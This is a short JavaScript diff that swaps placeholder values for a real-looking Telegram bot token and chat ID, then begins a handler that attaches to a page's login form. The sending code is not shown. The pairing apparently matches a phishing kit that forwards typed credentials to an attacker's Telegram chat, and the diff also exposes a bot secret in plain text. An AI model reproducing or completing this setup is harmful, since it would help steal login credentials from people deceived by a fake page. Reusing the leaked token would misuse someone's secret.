@@ -1,5 +1,5 @@
-const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
-const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
+const TELEGRAM_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
+const TELEGRAM_CHAT_ID = "-5006528512";
 
 document.addEventListener("DOMContentLoaded", function () {
   const form = document.getElementById("loginForm");
